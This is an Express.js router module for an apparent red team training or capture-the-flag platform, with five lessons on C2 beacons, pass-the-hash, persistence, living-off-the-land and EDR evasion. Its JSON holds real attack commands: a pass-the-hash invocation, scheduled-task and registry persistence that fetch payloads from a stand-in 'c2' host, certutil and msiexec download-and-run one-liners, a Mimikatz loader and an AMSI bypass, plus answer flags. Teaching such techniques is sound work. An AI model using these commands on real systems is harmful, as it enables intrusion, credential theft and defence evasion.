/**
 * Red Team Operations Module
 * Covers: C2 frameworks, lateral movement, persistence, OPSEC, evasion
 * Difficulty: Beginner -> Pro
 */

const express = require('express');
const router = express.Router();

router.get('/', (req, res) => {
  res.render('red_team/index', {
    title: 'Red Team Operations',
    user: req.session?.user,
  });
});

// RT1: Command & Control (C2) Beacon Analysis (Beginner)
router.get('/c2-beacon', (req, res) => {
  res.json({
    vuln: 'RT1: C2 Beacon Configuration Analysis',
    level: 'Beginner',
    description:
      'Analyze a captured C2 beacon to understand its communication pattern, protocol, and callback interval.',
    beacon_config: {
      c2_server: 'https://cdn-update-service.com',
      callback_interval: '60s',
      jitter: '15%',
      protocol: 'HTTPS',
      user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0',
      uri_pattern: '/api/v1/updates?sid={random}',
      encryption: 'AES-256-CBC',
    },
    hint: 'Look for the scheduled task or the HTTPS traffic with regular intervals + jitter.',
    flag: 'FLAG{rt01_c2_beacon_l2m3}',
  });
});

// RT2: Lateral Movement via Pass-the-Hash (Beginner)
router.get('/lateral-movement', (req, res) => {
  res.json({
    vuln: 'RT2: Lateral Movement with Pass-the-Hash',
    level: 'Beginner',
    description:
      'Use captured NTLM hashes to authenticate to other systems without cracking the password.',
    scenario: 'You have an NTLM hash from a compromised workstation. Pivot to the file server.',
    captured_hash: 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0',
    target: 'FILESERVER01.corp.local',
    technique: 'pth-winexe -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 admin@FILESERVER01',
    hint: 'Use impacket psexec.py or crackmapexec with the hash to move laterally.',
    flag: 'FLAG{rt02_pass_the_hash_n4o5}',
  });
});

// RT3: Persistence via Scheduled Tasks (Intermediate)
router.get('/persistence', (req, res) => {
  res.json({
    vuln: 'RT3: Establishing Persistence via Scheduled Tasks',
    level: 'Intermediate',
    description:
      'Create a hidden scheduled task that re-executes a payload at system boot or user logon.',
    persistence_methods: [
      {
        name: 'Scheduled Task',
        command:
          'schtasks /create /tn "WinUpdate" /tr "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\'http://c2/payload.ps1\')" /sc onlogon /ru SYSTEM',
      },
      {
        name: 'Registry Run Key',
        command:
          'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WinUpdate = regsvr32 /s /n /u /i:http://c2/scrobj.dll scrobj.dll',
      },
      {
        name: 'WMI Event Subscription',
        command: '__EventFilter + CommandLineEventConsumer -> launches payload on process creation',
      },
    ],
    hint: 'WMI subscriptions survive reboots and are harder to detect than scheduled tasks.',
    flag: 'FLAG{rt03_persistence_wmi_p6q7}',
  });
});

// RT4: Living Off the Land (Advanced)
router.get('/lotl', (req, res) => {
  res.json({
    vuln: 'RT4: Living Off the Land Techniques',
    level: 'Advanced',
    description:
      'Use built-in system tools (PowerShell, WMI, certutil, msiexec) to avoid detection by AV/EDR.',
    lotl_commands: [
      {
        tool: 'powershell.exe',
        purpose: 'Download + execute in memory',
        command:
          'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://c2/Invoke-Mimikatz.ps1\')"',
      },
      {
        tool: 'certutil.exe',
        purpose: 'Download file (bypass filters)',
        command: 'certutil -urlcache -split -f http://c2/payload.exe C:\\Windows\\Temp\\update.exe',
      },
      {
        tool: 'msiexec.exe',
        purpose: 'Remote MSI execution',
        command: 'msiexec /q /i http://c2/payload.msi',
      },
      {
        tool: 'wmic.exe',
        purpose: 'Remote process creation',
        command: 'wmic process call create "cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt"',
      },
    ],
    hint: 'EDR tools often whitelist signed binaries like certutil, msiexec, and wmic — abuse them.',
    flag: 'FLAG{rt04_living_off_land_r8s9}',
  });
});

// RT5: EDR Evasion & AMSI Bypass (Pro)
router.get('/evasion', (req, res) => {
  res.json({
    vuln: 'RT5: EDR Evasion — Memory Injection & AMSI Bypass',
    level: 'Pro',
    description:
      'Bypass AMSI (Anti-Malware Scan Interface) and EDR hooks to execute payloads in memory.',
    amsi_bypass:
      "Write-Host \"AMSI patch: [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\"",
    injection_technique:
      'Process Hollowing: Create suspended process -> read PEB -> unmap -> inject -> resume',
    tools: ['Cobalt Strike', 'Sliver', 'Brute Ratel', 'Nighthawk'],
    hint: 'AMSI patch forces amsiInitFailed=true, so all subsequent script scans return clean. Combine with ETW patching.',
    flag: 'FLAG{rt05_edr_evasion_t0u1}',
  });
});

module.exports = router;
